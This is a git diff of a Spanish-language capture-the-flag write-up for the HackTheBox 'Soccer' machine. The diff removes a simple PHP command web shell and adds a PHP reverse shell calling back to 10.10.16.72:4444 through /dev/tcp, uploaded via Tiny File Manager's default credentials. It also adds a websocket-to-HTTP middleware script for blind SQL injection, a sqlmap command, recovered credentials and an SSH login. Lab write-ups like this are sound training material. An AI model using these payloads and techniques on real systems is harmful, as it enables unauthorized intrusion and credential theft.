@@ -134,19 +134,132 @@ Usando la herramienta "gobuster" descubrimos que tiene un subdirectorio llamado 
 
 ![image](https://user-images.githubusercontent.com/109216235/208491633-e084a3e6-4f79-429d-863f-116fc812e1f3.png)
 
-Buscamos sobre "Tiny File Manager" y descubrimos que tiene un github con las credenciales por defecto (https://github.com/prasathmani/tinyfilemanager/blob/master/tinyfilemanager.php)
-
-Mirando por la página vemos que podemos subir archivos en la carpeta "tiny". Nos preparamos una cmd en php y la subimos a la página
-
-```php
-<?php
-echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
-?>
-```
-
-
 
 # [](#header-2) Vulnerabilidad
 
 
+Buscamos sobre "Tiny File Manager" y descubrimos que tiene un github con las credenciales por defecto (https://github.com/prasathmani/tinyfilemanager/blob/master/tinyfilemanager.php)
+
+Mirando por la página vemos que podemos subir archivos en la carpeta ```/tiny```. Nos preparamos una cmd en php y la subimos a la página
+
+```php
+<?php
+  system("bash -c 'bash -i >& /dev/tcp/10.10.16.72/4444 0>&1'")
+?>
+```
+
+Subimos este archivo, activamos netcat con el puerto que hayamos puesto en el script anterior y lo ejecutamos añadiendo /uploads/cmd.php a la url. Así conseguimos una revershell de www-data
+
+Investigando el interior de la plataforma, encontramos en la carpeta ```/etc/nginx/sites-available``` donde esta el archivo soc-player.htb
+
+```javascript
+cat soc-player.htb
+server {
+ listen 80;
+ listen [::]:80;
+
+ server_name soc-player.soccer.htb;
+
+ root /root/app/views;
+
+ location / {
+  proxy_pass http://localhost:3000;
+  proxy_http_version 1.1;
+  proxy_set_header Upgrade $http_upgrade;
+  proxy_set_header Connection 'upgrade';
+  proxy_set_header Host $host;
+  proxy_cache_bypass $http_upgrade;
+ }
+}
+```
+
+Así localizamos que soccer.htb tiene un subdominio y lo añadiremos a nuestro /etc/hosts. En esa página nos podemos registrar y al hacerlo nos dan un ticket y viendo el codigo de la pagina vemos que usa websocket. Buscando sobre "SQLi websocket" encontramos un blog (https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) sobre como explotar esta vulnerabilidad.
+
+Siguiendo los pasos del blog se nos quedará un codigo así, solo tendriamos que cambiar "ws_server = " y "data = data = '{"id":"%s"}' % message
+
+```python
+from http.server import SimpleHTTPRequestHandler
+from socketserver import TCPServer
+from urllib.parse import unquote, urlparse
+from websocket import create_connection
+
+ws_server = "ws://soc-player.soccer.htb:9091/ws"
+
+def send_ws(payload):
+	ws = create_connection(ws_server)
+	# If the server returns a response on connect, use below line	
+	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
+	
+	# For our case, format the payload in JSON
+	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
+	data = '{"employeeID":"%s"}' % message
+
+	ws.send(data)
+	resp = ws.recv()
+	ws.close()
+
+	if resp:
+		return resp
+	else:
+		return ''
+
+def middleware_server(host_port,content_type="text/plain"):
+
+	class CustomHandler(SimpleHTTPRequestHandler):
+		def do_GET(self) -> None:
+			self.send_response(200)
+			try:
+				payload = urlparse(self.path).query.split('=',1)[1]
+			except IndexError:
+				payload = False
+				
+			if payload:
+				content = send_ws(payload)
+			else:
+				content = 'No parameters specified!'
+
+			self.send_header("Content-type", content_type)
+			self.end_headers()
+			self.wfile.write(content.encode())
+			return
+
+	class _TCPServer(TCPServer):
+		allow_reuse_address = True
+
+	httpd = _TCPServer(host_port, CustomHandler)
+	httpd.serve_forever()
+
+
+print("[+] Starting MiddleWare Server")
+print("[+] Send payloads in http://localhost:8081/?id=*")
+
+try:
+	middleware_server(('0.0.0.0',8081))
+except KeyboardInterrupt:
+	pass
+```
+
+Este código lo ejecutariamos en nuestra máquina local y en otra terminal ejecutariamos el siguiente comando
+
+```sql
+sqlmap -u "http://localhost:8081/?id=1" -p "id"
+```
+
+Este proceso puede tardar una eternidad pero con paciencia conseguiras la contraseña
+
+```sql
++------+-------------------+----------+----------------------+
+| id   | email             | username | password             |
++------+-------------------+----------+----------------------+
+| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |
++------+-------------------+----------+----------------------+
+```
+
+Teniendo la contraseña podemos conectarnos al ssh y conseguir la user.txt
+
+```ssh
+ssh player@10.129.116.169
+player@10.129.116.169's password: PlayerOftheMatch2022
+```
 # [](#header-2) Escalada de privilegios
+
